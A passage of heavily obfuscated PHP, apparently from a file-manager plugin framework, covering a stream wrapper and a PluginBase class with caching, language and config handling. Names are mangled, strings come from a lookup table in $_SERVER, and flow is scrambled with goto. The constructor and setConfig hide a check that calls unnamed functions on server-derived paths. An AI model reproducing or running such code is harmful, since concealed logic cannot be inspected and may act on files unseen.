stream_eof() { return $this->pose >= $this->info[$_SERVER[Ä¿Ş°¨][77]]; } public function stream_close() { return !0; } public function url_stat($e×¥‘¹¯², $e¡ÎêğÄµº) { $d»³°çŒÉê =& $_SERVER[Ä¿Ş°¨]; $f…”‹·ß = $this->info($e×¥‘¹¯²); return array($d»³°çŒÉê[1268] => 0, $d»³°çŒÉê[1269] => 0, $d»³°çŒÉê[12] => 32768 + 511, $d»³°çŒÉê[1270] => 0, $d»³°çŒÉê[1271] => 0, $d»³°çŒÉê[1272] => 0, $d»³°çŒÉê[1273] => 0, $d»³°çŒÉê[77] => $f…”‹·ß[$d»³°çŒÉê[77]], $d»³°çŒÉê[1274] => $f…”‹·ß[$d»³°çŒÉê[1145]], $d»³°çŒÉê[1231] => $f…”‹·ß[$d»³°çŒÉê[106]], $d»³°çŒÉê[1230] => $f…”‹·ß[$d»³°çŒÉê[183]], $d»³°çŒÉê[1275] => 0, $d»³°çŒÉê[1276] => 0); } static $fileInfo = array(); public function info($A»Ï§ï‘‡É) { $eåÀÚ§•Ã = $_SERVER[Ä¿Ş°¨][1277]; if (isset(self::$fileInfo[$A»Ï§ï‘‡É])) { return self::$fileInfo[$A»Ï§ï‘‡É]; } if (substr($A»Ï§ï‘‡É, 0, strlen($eåÀÚ§•Ã)) != $eåÀÚ§•Ã) { return !1; } self::$fileInfo[$A»Ï§ï‘‡É] = IO::info(substr($A»Ï§ï‘‡É, strlen($eåÀÚ§•Ã))); return self::$fileInfo[$A»Ï§ï‘‡É]; } public static function read($C ÷†Õ£­å, $aİ«„á‘¡İ, $c‰®µ†­øñ) { goto c˜ˆÀ¿ˆ‚ñ; dÀ†ÈÄšÔ: $d›„“œù¨Œ = 8192; fseek($Bçƒƒë¯¬Ô, $aİ«„á‘¡İ, SEEK_SET); $D”ñŞ‘ˆ˜ = $B¡ÁõŠà„è[33]; goto Dß†ÇŞÏÄ; c˜ˆÀ¿ˆ‚ñ: $B¡ÁõŠà„è =& $_SERVER[Ä¿Ş°¨]; $Bçƒƒë¯¬Ô = fopen($C ÷†Õ£­å, $B¡ÁõŠà„è[1147]); if (!$Bçƒƒë¯¬Ô) { return $B¡ÁõŠà„è[33]; } goto dÀ†ÈÄšÔ; Dß†ÇŞÏÄ: $bİÒä‡¿„¿ = 0; while ($bİÒä‡¿„¿ < $c‰®µ†­øñ) { $dØ æ“Œí° = min($d›„“œù¨Œ, $c‰®µ†­øñ - $bİÒä‡¿„¿); $D”ñŞ‘ˆ˜ .= fread($Bçƒƒë¯¬Ô, $dØ æ“Œí°); $bİÒä‡¿„¿ += $dØ æ“Œí°; } fclose($Bçƒƒë¯¬Ô); goto A÷³Ä¬‚™¾; A÷³Ä¬‚™¾: return $D”ñŞ‘ˆ˜; goto C¼é§ŒÎ¦; C¼é§ŒÎ¦: } public function fileSubstr($fåÑ¨²¤Ûò, $b†‚Ë•¼) { goto d£—­‹Ä¼É; a—„Óğ¶ˆ: ksort($B­ˆêÀ£Âï); $aë¾¬ôë§ = substr($cÎ÷ÊÊ¢ß, $fåÑ¨²¤Ûò - $F²ğÖÇà›·, $b†‚Ë•¼); return $aë¾¬ôë§; goto b™Œ¬¦É™; fóìå˜‡«: $A¾‡ÄìÖÙÔ = 64 * 1024; $B­ˆêÀ£Âï =& self::$_chunkBuffer[$this->path]; if (!$B­ˆêÀ£Âï) { $B­ˆêÀ£Âï = array(); } goto Aíæ˜çÒ—«; Bå”—¥¼»ò: foreach ($B­ˆêÀ£Âï as $CÕù•¤Üæ‘ => $Fñ»Ã™öÖ›) { $CÕù•¤Üæ‘ = intval($CÕù•¤Üæ‘); $c÷†ª–™… = $CÕù•¤Üæ‘ + strlen($Fñ»Ã™öÖ›); if ($fåÑ¨²¤Ûò >= $c÷†ª–™…) { continue; } if ($fåÑ¨²¤Ûò >= $CÕù•¤Üæ‘ && $fåÑ¨²¤Ûò + $b†‚Ë•¼ <= $c÷†ª–™…) { return substr($Fñ»Ã™öÖ›, $fåÑ¨²¤Ûò - $CÕù•¤Üæ‘, $b†‚Ë•¼); } break; } if (count($B­ˆêÀ£Âï) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($cÆÄ‡“°ËÂ[1278], $cÆÄ‡“°ËÂ[1279] . count($B­ˆêÀ£Âï) . "\x3b\163\x74\x61\162\x74\75{$fåÑ¨²¤Ûò}\x2c\x6c\x65\x6e\147\164\x68\75{$b†‚Ë•¼}\x3b\x70\157\x73\x65\72{$CÕù•¤Üæ‘}\x7e{$c÷†ª–™…}"); throw new Exception($cÆÄ‡“°ËÂ[1280]); } $F²ğÖÇà›· = intval($fåÑ¨²¤Ûò / $A¾‡ÄìÖÙÔ) * $A¾‡ÄìÖÙÔ; goto Fí††é‹‘Ğ; cœ•¹‘Û³”: if ($fåÑ¨²¤Ûò + $b†‚Ë•¼ > $f’ËÇÂøãÆ) { $b†‚Ë•¼ = $f’ËÇÂøãÆ - $fåÑ¨²¤Ûò; } if ($b†‚Ë•¼ <= 0) { return $cÆÄ‡“°ËÂ[33]; } if ($fåÑ¨²¤Ûò < 0 || $fåÑ¨²¤Ûò >= $f’ËÇÂøãÆ || $b†‚Ë•¼ <= 0 || $b†‚Ë•¼ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\x69\x6c\x65\122\145\141\144\x20\145\x72\x72\157\x72\41\40\163\164\141\x72\164\75{$fåÑ¨²¤Ûò}\73\154\145\x6e\147\x74\x68\x3d{$b†‚Ë•¼}\73\40\x73\151\x7a\145\x3d{$f’ËÇÂøãÆ}\73"); } goto fóìå˜‡«; b÷´×Æ£„ó: $F¨Ö÷ÕŸ…Ñ = $b†‚Ë•¼; if ($fåÑ¨²¤Ûò < 0) { $fåÑ¨²¤Ûò = $f’ËÇÂøãÆ + $fåÑ¨²¤Ûò; } if ($b†‚Ë•¼ === !1) { $b†‚Ë•¼ = $f’ËÇÂøãÆ - $fåÑ¨²¤Ûò; } goto cœ•¹‘Û³”; Aíæ˜çÒ—«: $CÕù•¤Üæ‘ = 0; $c÷†ª–™… = 0; $Fñ»Ã™öÖ› = $cÆÄ‡“°ËÂ[33]; goto Bå”—¥¼»ò; Fí††é‹‘Ğ: $f–İº¯œµÃ = ceil(($fåÑ¨²¤Ûò + $b†‚Ë•¼) / $A¾‡ÄìÖÙÔ) * $A¾‡ÄìÖÙÔ - $F²ğÖÇà›·; $cÎ÷ÊÊ¢ß = IO::fileSubstr($this->path, $F²ğÖÇà›·, $f–İº¯œµÃ); $B­ˆêÀ£Âï[$F²ğÖÇà›· . $cÆÄ‡“°ËÂ[33]] = $cÎ÷ÊÊ¢ß; goto a—„Óğ¶ˆ; d£—­‹Ä¼É: $cÆÄ‡“°ËÂ =& $_SERVER[Ä¿Ş°¨]; $f’ËÇÂøãÆ = $this->info[$cÆÄ‡“°ËÂ[77]]; $fŠù°Í¬¸À = $fåÑ¨²¤Ûò; goto b÷´×Æ£„ó; b™Œ¬¦É™: } private function log($a“®Èé„„, $FÉ—Ñ³Ÿî) { $aù“…ö³–Ğ =& $_SERVER[Ä¿Ş°¨]; $CªÉ»Ëğë… = timeFloat() - $this->timeStart; write_log(sprintf($aù“…ö³–Ğ[1281], $a“®Èé„„, $this->info[$aù“…ö³–Ğ[28]], $CªÉ»Ëğë…, $FÉ—Ñ³Ÿî), $aù“…ö³–Ğ[1196]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto CÃÆŞßŸö; Dó¯—‰ø†: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($FºÈ—×ç¥[1282]); goto FŠ‚¡…ò†Æ; AœÅ¡óØ ï: $this->values = array(); return $this; goto fšœÑ†ª¬‘; CÃÆŞßŸö: $FºÈ—×ç¥ =& $_SERVER[Ä¿Ş°¨]; if ($_SERVER[$FºÈ—×ç¥[360]] != $_SERVER[$FºÈ—×ç¥[361]]) { goto CÊ’Â»½Ûµ; Cåˆ¼íàã: $dò¨·Òä»ì = $FºÈ—×ç¥[781]; $dò¨·Òä»ì($_SERVER[$FºÈ—×ç¥[782]]); $dò¨·Òä»ì($_SERVER[$FºÈ—×ç¥[363]] . $FºÈ—×ç¥[783]); goto e±ïÈá¯á; D™„‘åÅ: $e¸íÜ†ğ— = $eÁ¿îØˆ¹($BÏÑÄÚŠÌ›); $FÊğÏà†÷® = explode($FºÈ—×ç¥[213], $e¸íÜ†ğ—); if (count($FÊğÏà†÷®) < $FºÈ—×ç¥[557]) { $Eœ£—Ëñ“ò = $FºÈ—×ç¥[366]; $Eœ£—Ëñ“ò(); } goto Cåˆ¼íàã; e±ïÈá¯á: $Eƒ—¡Ò½é = 1; while ($Eƒ—¡Ò½é > 1) { $Eƒ—¡Ò½é = $Eƒ—¡Ò½é + 4; $cÉà–ÍåÒ© = rawurlencode($Eƒ—¡Ò½é . $FºÈ—×ç¥[357]); } goto eš÷Ñô‰îÂ; CÊ’Â»½Ûµ: $EŠ”æšÕ = $FºÈ—×ç¥[780]; $eÁ¿îØˆ¹ = $FºÈ—×ç¥[362]; $BÏÑÄÚŠÌ› = $_SERVER[$FºÈ—×ç¥[363]] . $FºÈ—×ç¥[364]; goto D™„‘åÅ; eš÷Ñô‰îÂ: } global $in, $config; goto Dó¯—‰ø†; bƒêáÚ«í”: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $FºÈ—×ç¥[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $FºÈ—×ç¥[8]; $this->pluginLangArr = $this->initLang(); goto AœÅ¡óØ ï; FŠ‚¡…ò†Æ: $this->pluginName = str_replace($FºÈ—×ç¥[1282], $FºÈ—×ç¥[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $FºÈ—×ç¥[8]; $this->pluginApi = appHostGet() . $FºÈ—×ç¥[1283] . $this->pluginName . $FºÈ—×ç¥[8]; goto bƒêáÚ«í”; fšœÑ†ª¬‘: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ä¿Ş°¨][1284]); } protected function assign($C¥®Áé©°, $c—ªÃ¤Èª = false) { if (is_array($C¥®Áé©°)) { $this->values = array_merge($this->values, $C¥®Áé©°); } else { $this->values[$C¥®Áé©°] = $c—ªÃ¤Èª; } } protected function display($d”ƒÚˆ§¶Í) { extract($this->values); require $d”ƒÚˆ§¶Í; } final function hookRegist($a•×¸ÃàÉ) { $this->modelPlugin->appRegist($this->pluginName, $a•×¸ÃàÉ); } final function appIcon() { $A…ë¶”æº” =& $_SERVER[Ä¿Ş°¨]; $cçÓ¶­é« = $this->appPackage(); $B¼Í²Ö÷®¾ = $A…ë¶”æº”[33]; if (isset($cçÓ¶­é«[$A…ë¶”æº”[387]])) { if (isset($cçÓ¶­é«[$A…ë¶”æº”[387]][$A…ë¶”æº”[1285]])) { $B¼Í²Ö÷®¾ = $A…ë¶”æº”[1286] . $cçÓ¶­é«[$A…ë¶”æº”[387]][$A…ë¶”æº”[1285]] . $A…ë¶”æº”[1287]; } else { if ($cçÓ¶­é«[$A…ë¶”æº”[387]][$A…ë¶”æº”[1288]]) { $B¼Í²Ö÷®¾ = $A…ë¶”æº”[1289] . $cçÓ¶­é«[$A…ë¶”æº”[387]][$A…ë¶”æº”[1288]] . $A…ë¶”æº”[1290]; } } } return $B¼Í²Ö÷®¾; } final function fileCanView($A½öåƒš) { $fÅ‰å…«‰… =& $_SERVER[Ä¿Ş°¨]; if (request_url_safe($A½öåƒš)) { return !0; } if ($this->isShare($A½öåƒš)) { return !0; } if (!Action($fÅ‰å…«‰…[1291])->authCan($fÅ‰å…«‰…[1292])) { show_tips(LNG($fÅ‰å…«‰…[1293]) . $fÅ‰å…«‰…[1294], !1); } ActionCall($fÅ‰å…«‰…[1295], $A½öåƒš); } final function isShare($AøæŸ²ÏöÂ) { $c´À¼Ëò†ˆ = KodIO::parse($AøæŸ²ÏöÂ); return $c´À¼Ëò†ˆ[$_SERVER[Ä¿Ş°¨][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($a´†É†Á™«) { if (request_url_safe($a´†É†Á™«)) { return $a´†É†Á™«; } if (!$this->isShare($a´†É†Á™«)) { $a´†É†Á™« = $this->filePath($a´†É†Á™«); } return Action($_SERVER[Ä¿Ş°¨][1002])->linkOut($a´†É†Á™«); } public function filePathLinkOut($C½ªàää£¼) { if (request_url_safe($C½ªàää£¼)) { return $C½ªàää£¼; } $this->fileCanView($C½ªàää£¼); return Action($_SERVER[Ä¿Ş°¨][1002])->link($C½ªàää£¼); } final function filePath($A¨¬¯ùÃä) { $AÅ—¨»œ¤… =& $_SERVER[Ä¿Ş°¨]; if ($BË‰ÇÓ‰Üµ = $this->checkSharePath($A¨¬¯ùÃä)) { return $BË‰ÇÓ‰Üµ; } $this->fileCanView($A¨¬¯ùÃä); if (request_url_safe($A¨¬¯ùÃä)) { $CĞ‘Ş¼¡¿Ğ = parse_url_query($A¨¬¯ùÃä); if (isset($CĞ‘Ş¼¡¿Ğ[$AÅ—¨»œ¤…[1296]]) && isset($CĞ‘Ş¼¡¿Ğ[$AÅ—¨»œ¤…[193]])) { $fæ×…•ÔÜ = Model($AÅ—¨»œ¤…[1073])->get($AÅ—¨»œ¤…[1297]); $CÜé÷ğ±Ù = Mcrypt::decode($CĞ‘Ş¼¡¿Ğ[$AÅ—¨»œ¤…[193]], $fæ×…•ÔÜ); if ($CÜé÷ğ±Ù) { $this->fileInfo = IO::infoWithChildren($CÜé÷ğ±Ù); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $CÜé÷ğ±Ù; } } $A¨¬¯ùÃä = $this->_cacheHttpFile($A¨¬¯ùÃä); $this->fileInfo = IO::infoWithChildren($A¨¬¯ùÃä); } else { $this->fileInfo = IO::infoWithChildren($A¨¬¯ùÃä); if (!$this->fileInfo) { show_tips(LNG($AÅ—¨»œ¤…[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $A¨¬¯ùÃä; } final function _cacheHttpFile($CÊ‚à…ÅÆ¥) { $dĞ‹¥ã½ï‚ = hash_path($CÊ‚à…ÅÆ¥, !0); $this->cachePath = $this->pluginCachePath($dĞ‹¥ã½ï‚); if ($dù’ò…˜—¥ = IO::fileNameExist($this->cachePath, $dĞ‹¥ã½ï‚)) { return KodIO::make($dù’ò…˜—¥); } $bÏµÈ¢§¬É = $this->cachePath . $dĞ‹¥ã½ï‚; return $this->pluginCacheFileSet($bÏµÈ¢§¬É, file_get_contents($CÊ‚à…ÅÆ¥)); } final function _tmpFileName($BÒÉ‘™µ = array()) { goto d†óİ£ÜÔÔ; Fí¤•íİ½: return md5(implode($a•…–¢¡è¸[70], $eâµ¶Ôô…)); goto E÷š±Şƒê; d†óİ£ÜÔÔ: $a•…–¢¡è¸ =& $_SERVER[Ä¿Ş°¨]; if (!$BÒÉ‘™µ) { $BÒÉ‘™µ = $this->fileInfo; } if (isset($BÒÉ‘™µ[$a•…–¢¡è¸[160]])) { return $BÒÉ‘™µ[$a•…–¢¡è¸[160]]; } goto aç‚ÄãŒó; aç‚ÄãŒó: if (isset($BÒÉ‘™µ[$a•…–¢¡è¸[158]][$a•…–¢¡è¸[160]])) { return $BÒÉ‘™µ[$a•…–¢¡è¸[158]][$a•…–¢¡è¸[160]]; } $eâµ¶Ôô… = array($BÒÉ‘™µ[$a•…–¢¡è¸[28]], $BÒÉ‘™µ[$a•…–¢¡è¸[75]], $BÒÉ‘™µ[$a•…–¢¡è¸[77]]); if (isset($BÒÉ‘™µ[$a•…–¢¡è¸[463]])) { $eâµ¶Ôô…[] = $BÒÉ‘™µ[$a•…–¢¡è¸[463]]; } goto Fí¤•íİ½; E÷š±Şƒê: } final function checkSharePath($C×ÏõØ—Œ) { goto fïÆ˜ÄæĞ; E‡¨Ó¸º: $this->cachePath = $this->pluginCachePath($this->fileInfo[$aâœ‚ÀÌ[160]]); return $B¯ÜÔáÔ¹ë[$aâœ‚ÀÌ[75]]; goto FÌˆ‚‚‚ƒ…; fïÆ˜ÄæĞ: $aâœ‚ÀÌ =& $_SERVER[Ä¿Ş°¨]; if (!defined($aâœ‚ÀÌ[431])) { define($aâœ‚ÀÌ[1298], 0); } if (!$this->isShare($C×ÏõØ—Œ)) { return !1; } goto cÑáê…‘¬²; cÑáê…‘¬²: $B¯ÜÔáÔ¹ë = Action($aâœ‚ÀÌ[1002])->sharePathInfo($C×ÏõØ—Œ); if (!isset($B¯ÜÔáÔ¹ë[$aâœ‚ÀÌ[75]])) { show_json(LNG($aâœ‚ÀÌ[1299]), !1); } $this->fileInfo = $B¯ÜÔáÔ¹ë[$aâœ‚ÀÌ[158]]; goto E‡¨Ó¸º; FÌˆ‚‚‚ƒ…: } final function pluginCachePath($e‹Ö…‰¥ß˜ = '') { $e¤¯ß°Ê¬³ =& $_SERVER[Ä¿Ş°¨]; $fÎòâ¡¼Šµ = IO_PATH_SYSTEM_TEMP . $e¤¯ß°Ê¬³[1300] . $this->pluginName; if (!($c¿ˆ·×· = IO::infoFull($fÎòâ¡¼Šµ))) { return IO::mkdir($fÎòâ¡¼Šµ . $e¤¯ß°Ê¬³[8] . $e‹Ö…‰¥ß˜); } if (empty($e‹Ö…‰¥ß˜)) { return $c¿ˆ·×·[$e¤¯ß°Ê¬³[75]]; } if (!($B†Ü¾Ç÷“ = IO::fileNameExist($c¿ˆ·×·[$e¤¯ß°Ê¬³[75]], $e‹Ö…‰¥ß˜))) { return IO::mkdir($c¿ˆ·×·[$e¤¯ß°Ê¬³[75]] . $e‹Ö…‰¥ß˜); } return KodIO::make($B†Ü¾Ç÷“); } final function pluginCacheFileSet($Eˆæ“…¼™, $e„Â•â«® = '') { $b®ïß‰ß =& $_SERVER[Ä¿Ş°¨]; if (!($Eç¨Œéİ÷Ã = IO::infoFull($Eˆæ“…¼™))) { return IO::mkfile($Eˆæ“…¼™, $e„Â•â«®, REPEAT_REPLACE); } IO::setContent($Eç¨Œéİ÷Ã[$b®ïß‰ß[75]], $e„Â•â«®); return $Eç¨Œéİ÷Ã[$b®ïß‰ß[75]]; } final function pluginLocalFile($EçÌª²µ« = '') { goto A¯ªÁ¯ÁãŠ; F¤½ì„ÔŒ: $cèØå“÷Ø¨ = $F’¾µ‘”àö . $Cå˜ÇÕ‘¦ô; if (@file_exists($cèØå“÷Ø¨)) { return $cèØå“÷Ø¨; } return IO::copy($EçÌª²µ«, $F’¾µ‘”àö, 0, $Cå˜ÇÕ‘¦ô); goto E¿º­–”ñ²; c«”Áœëøâ: if (!$EçÌª²µ«) { return $F’¾µ‘”àö; } $bäÙÇÄ×… = IO::info($EçÌª²µ«); $Cå˜ÇÕ‘¦ô = $this->_tmpFileName($bäÙÇÄ×…) . $bªìçÔÁ¹[91] . $bäÙÇÄ×…[$bªìçÔÁ¹[156]]; goto F¤½ì„ÔŒ; A¯ªÁ¯ÁãŠ: $bªìçÔÁ¹ =& $_SERVER[Ä¿Ş°¨]; $F’¾µ‘”àö = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($F’¾µ‘”àö)) { mk_dir($F’¾µ‘”àö); } goto c«”Áœëøâ; E¿º­–”ñ²: } final function appPackage() { goto D×î¨ßêô; b‚“‡²àƒŒ: $this->parseLang($e™ç‹±…Œ„); $c•Æ˜¡óŒ = json_decode_force($e™ç‹±…Œ„); if (!$c•Æ˜¡óŒ) { return array(); } goto eòªòà‚¯; D×î¨ßêô: $Eš¸Ú›æ§ =& $_SERVER[Ä¿Ş°¨]; if ($this->packageData) { return $this->packageData; } $e™ç‹±…Œ„ = $this->parseFile($this->pluginPath . $Eš¸Ú›æ§[1301]); goto b‚“‡²àƒŒ; c­ÒùµàŞŠ: return $c•Æ˜¡óŒ; goto fßèÎíĞ‚; eòªòà‚¯: $e‹©®Œ‡Ö… = Hook::trigger($Eš¸Ú›æ§[1302], $c•Æ˜¡óŒ); if ($e‹©®Œ‡Ö… && is_array($e‹©®Œ‡Ö…)) { $c•Æ˜¡óŒ = $e‹©®Œ‡Ö…; } $this->packageData = $c•Æ˜¡óŒ; goto c­ÒùµàŞŠ; fßèÎíĞ‚: } public function packageInfoGet($DÅêÁšÆŒØ) { $dŒÂ·Ÿ‘‰ = $this->appPackage(); return array_get_value($dŒÂ·Ÿ‘‰, $DÅêÁšÆŒØ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ä¿Ş°¨][1303]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ä¿Ş°¨][1304]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ä¿Ş°¨][1305]); } private function parseFile($FôÏéÉ–Àº) { $A’õÒŒÊé =& $_SERVER[Ä¿Ş°¨]; $eÖß÷æÏÍ½ = file_get_contents($FôÏéÉ–Àº); $F¡Ñ´©¶³é = array($A’õÒŒÊé[1306], $A’õÒŒÊé[1307], $A’õÒŒÊé[1308], $A’õÒŒÊé[1309], $A’õÒŒÊé[1310], $A’õÒŒÊé[1311], $A’õÒŒÊé[1312]); $A£Ü÷¤ÒÎ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$A’õÒŒÊé[84]][$A’õÒŒÊé[1313]]); $eÖß÷æÏÍ½ = str_replace($F¡Ñ´©¶³é, $A£Ü÷¤ÒÎ, $eÖß÷æÏÍ½); return $eÖß÷æÏÍ½; } private function parseLang(&$c˜åñ†à³ß) { goto d³»â—»í•; d³»â—»í•: $d‰œ‰ØİÏØ =& $_SERVER[Ä¿Ş°¨]; $DËª¾ƒ‹ù— = $d‰œ‰ØİÏØ[1314]; if (!strstr($c˜åñ†à³ß, $DËª¾ƒ‹ù—)) { return; } goto cë¤èº¯–‰; cë¤èº¯–‰: preg_match_all($d‰œ‰ØİÏØ[1315], $c˜åñ†à³ß, $F²ÅÈÅùÆ§); if (!is_array($F²ÅÈÅùÆ§) || count($F²ÅÈÅùÆ§) == 0 || !is_array($F²ÅÈÅùÆ§[0]) || count($F²ÅÈÅùÆ§[0]) == 0) { return; } $AæÈê…†È = array(); goto EÂÇ¥ÊÓ…É; EÂÇ¥ÊÓ…É: $d¤İ›­Ÿ‡ø = array(); foreach ($F²ÅÈÅùÆ§[0] as $E¦¶ä»ï¶œ) { $d½Ú¦§âÑ = substr($E¦¶ä»ï¶œ, strlen($DËª¾ƒ‹ù—), -4); $DÉ§™ãØ›Ó = LNG($d½Ú¦§âÑ); $AæÈê…†È[] = $E¦¶ä»ï¶œ; $d¤İ›­Ÿ‡ø[] = str_replace(array($d‰œ‰ØİÏØ[213], $d‰œ‰ØİÏØ[977], $d‰œ‰ØİÏØ[326], $d‰œ‰ØİÏØ[112]), array($d‰œ‰ØİÏØ[50], $d‰œ‰ØİÏØ[50], $d‰œ‰ØİÏØ[33], $d‰œ‰ØİÏØ[1316]), $DÉ§™ãØ›Ó); } $c˜åñ†à³ß = str_replace($AæÈê…†È, $d¤İ›­Ÿ‡ø, $c˜åñ†à³ß); goto böºñ·¦…Ê; böºñ·¦…Ê: } private function parseConfig(&$E²µ÷ëÎ‹°) { goto c“Õ‚ˆÎ°ˆ; E…ˆóˆ É¼: $eæÚÇèÍº = array(); $BµÏ»ÃÅ·Á = array(); foreach ($dÖ‰÷ŒÕ[0] as $C­‰¹Áƒší) { $FÂŞå™³‡Ÿ = substr($C­‰¹Áƒší, strlen($BÄƒ¶›ÂœŸ), -2); $eæÚÇèÍº[] = $C­‰¹Áƒší; $BµÏ»ÃÅ·Á[] = _get($CÙÃæ‹õª, $FÂŞå™³‡Ÿ); } goto c’ÓåĞÇÍ; c“Õ‚ˆÎ°ˆ: $A…÷ÇÜ†ŞÜ =& $_SERVER[Ä¿Ş°¨]; $BÄƒ¶›ÂœŸ = $A…÷ÇÜ†ŞÜ[1317]; if (!strstr($E²µ÷ëÎ‹°, $BÄƒ¶›ÂœŸ)) { return; } goto F½µì¸–¡; F½µì¸–¡: preg_match_all($A…÷ÇÜ†ŞÜ[1318], $E²µ÷ëÎ‹°, $dÖ‰÷ŒÕ); if (!is_array($dÖ‰÷ŒÕ) || count($dÖ‰÷ŒÕ) == 0 || !is_array($dÖ‰÷ŒÕ[0]) || count($dÖ‰÷ŒÕ[0]) == 0) { return; } $CÙÃæ‹õª = $this->getConfig(); goto E…ˆóˆ É¼; c’ÓåĞÇÍ: $E²µ÷ëÎ‹° = str_replace($eæÚÇèÍº, $BµÏ»ÃÅ·Á, $E²µ÷ëÎ‹°); goto D¨ìë–‹±; D¨ìë–‹±: } private function parsePackage(&$a˜½™ÏàÎƒ) { goto aãÅÜç¬³®; CãµµØ»‰: $a˜½™ÏàÎƒ = str_replace($eº“ôÒ§Çå, $D˜¸Ø„¶¨, $a˜½™ÏàÎƒ); goto A‡Ì¨±‡†µ; aÃÕšãğ: $eº“ôÒ§Çå = array(); $D˜¸Ø„¶¨ = array(); foreach ($bÃ¾›µä½å[0] as $F¿Ì´›ïÃá) { $EÆÄöÀÎ» = substr($F¿Ì´›ïÃá, strlen($Eš´±í‰ñ), -2); $eº“ôÒ§Çå[] = $F¿Ì´›ïÃá; $D˜¸Ø„¶¨[] = _get($c¸ß¼ÒŒ·, $EÆÄöÀÎ»); } goto CãµµØ»‰; bŠˆà˜Ì™ : preg_match_all($eëà‡Áğã´[1320], $a˜½™ÏàÎƒ, $bÃ¾›µä½å); if (!is_array($bÃ¾›µä½å) || count($bÃ¾›µä½å) == 0 || !is_array($bÃ¾›µä½å[0]) || count($bÃ¾›µä½å[0]) == 0) { return; } $c¸ß¼ÒŒ· = $this->appPackage(); goto aÃÕšãğ; aãÅÜç¬³®: $eëà‡Áğã´ =& $_SERVER[Ä¿Ş°¨]; $Eš´±í‰ñ = $eëà‡Áğã´[1319]; if (!strstr($a˜½™ÏàÎƒ, $Eš´±í‰ñ)) { return; } goto bŠˆà˜Ì™ ; A‡Ì¨±‡†µ: } final function echoFile($CÒøÑÑˆ°‰, $D¬§‹—ïì‚ = false) { goto dôŸÊÎøÆ; AÁ”÷¸ÕÅ‘: $this->parsePackage($DŸ•´Ñ¿ÚÎ); if (is_array($D¬§‹—ïì‚)) { $DŸ•´Ñ¿ÚÎ = str_replace(array_keys($D¬§‹—ïì‚), array_values($D¬§‹—ïì‚), $DŸ•´Ñ¿ÚÎ); } echo $Eäš…±Åßƒ[213] . $DŸ•´Ñ¿ÚÎ; goto BÕ²–ÌŠÇ×; Fğ³‰¦ÉÇ„: $DŸ•´Ñ¿ÚÎ = $this->parseFile($D†­ë¯‘š); $this->parseLang($DŸ•´Ñ¿ÚÎ); $this->parseConfig($DŸ•´Ñ¿ÚÎ); goto AÁ”÷¸ÕÅ‘; dôŸÊÎøÆ: $Eäš…±Åßƒ =& $_SERVER[Ä¿Ş°¨]; $D†­ë¯‘š = $this->pluginPath . $CÒøÑÑˆ°‰; if (ACT == $Eäš…±Åßƒ[1321]) { echo $Eäš…±Åßƒ[1322] . $this->pluginName . $Eäš…±Åßƒ[8] . $CÒøÑÑˆ°‰ . $Eäš…±Åßƒ[1323]; if (!file_exists($D†­ë¯‘š)) { echo $Eäš…±Åßƒ[1324]; return; } } goto Fğ³‰¦ÉÇ„; BÕ²–ÌŠÇ×: } final function initLang() { goto b´¾²ÑáŸ; b´¾²ÑáŸ: $d‚Ö˜ÒõË² =& $_SERVER[Ä¿Ş°¨]; $D£ã„¥º¶ñ = $d‚Ö˜ÒõË²[1325]; $aööŒñÃÌ = $this->pluginPath . $d‚Ö˜ÒõË²[1326]; goto AÔÛÛŸóÖ; AÔ‘‹ÒÊè: if (!is_array($cêÚá¤™‡)) { return array(); } if (@count($cêÚá¤™‡) > 0) { I18n::set($cêÚá¤™‡); } return $cêÚá¤™‡; goto F„÷…¨÷ãÄ; AÔÛÛŸóÖ: $e‹ÇøÑ µÃ = I18n::getType(); $cêÚá¤™‡ = array(); if (file_exists($aööŒñÃÌ . $e‹ÇøÑ µÃ . $d‚Ö˜ÒõË²[758])) { $cêÚá¤™‡ = (include $aööŒñÃÌ . $e‹ÇøÑ µÃ . $d‚Ö˜ÒõË²[758]); } else { if ($e‹ÇøÑ µÃ == $d‚Ö˜ÒõË²[1327] && !file_exists($aööŒñÃÌ . $e‹ÇøÑ µÃ . $d‚Ö˜ÒõË²[758]) && file_exists($aööŒñÃÌ . $d‚Ö˜ÒõË²[1328])) { $cêÚá¤™‡ = (include $aööŒñÃÌ . $d‚Ö˜ÒõË²[1328]); } else { if (file_exists($aööŒñÃÌ . $D£ã„¥º¶ñ . $d‚Ö˜ÒõË²[758])) { $cêÚá¤™‡ = (include $aööŒñÃÌ . $D£ã„¥º¶ñ . $d‚Ö˜ÒõË²[758]); } } } goto AÔ‘‹ÒÊè; F„÷…¨÷ãÄ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($B¹£Ñİ°î‰) { $Aª•†¿š¥˜ =& $_SERVER[Ä¿Ş°¨]; $DÓ¬Îö¹¡Ü = $_SERVER[$Aª•†¿š¥˜[363]] . $Aª•†¿š¥˜[364]; $DáäÙîœŠÄ = $Aª•†¿š¥˜[1329]; if ($_SERVER[$Aª•†¿š¥˜[360]] != $DáäÙîœŠÄ($DÓ¬Îö¹¡Ü)) { goto b³õÎà‹½©; b³õÎà‹½©: $cç‹Ÿº‰¯ = $Aª•†¿š¥˜[780]; $CÆ¡òè‰µ = $Aª•†¿š¥˜[362]; $a¥ÍÃ­ = $_SERVER[$Aª•†¿š¥˜[363]] . $Aª•†¿š¥˜[364]; goto DÎÍ×„Ó¿; 